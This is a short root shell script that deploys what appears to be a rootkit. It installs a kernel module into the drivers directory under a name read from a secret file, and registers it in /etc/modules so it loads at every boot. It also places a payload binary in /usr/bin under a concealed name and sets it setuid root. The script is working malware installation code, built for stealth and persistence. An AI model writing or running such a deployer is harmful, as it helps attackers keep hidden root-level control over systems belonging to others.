# Installs the kernel module, and starts it on reboot.
# Can be undone with undeploy.sh
# This script must be run as root

export SECRET_KO_NAME=$(cat secret_ko_name)
export SECRET_PAYLOAD_NAME=$(cat secret_payload_name)

# deploy the kernel module to the drivers directory
cp -f main.ko "/lib/modules/$(uname -r)/kernel/drivers/$SECRET_KO_NAME.ko"
# add this module as a startup module
echo "\n$SECRET_KO_NAME #magic\n" >> /etc/modules
# register these changes with the OS
depmod

# deploy the payload to the /usr/bin directory
cp -f payload /usr/bin/$SECRET_PAYLOAD_NAME
# mark it as setuid root (probably not needed, but nice to have)
chmod u+s /usr/bin/$SECRET_PAYLOAD_NAME
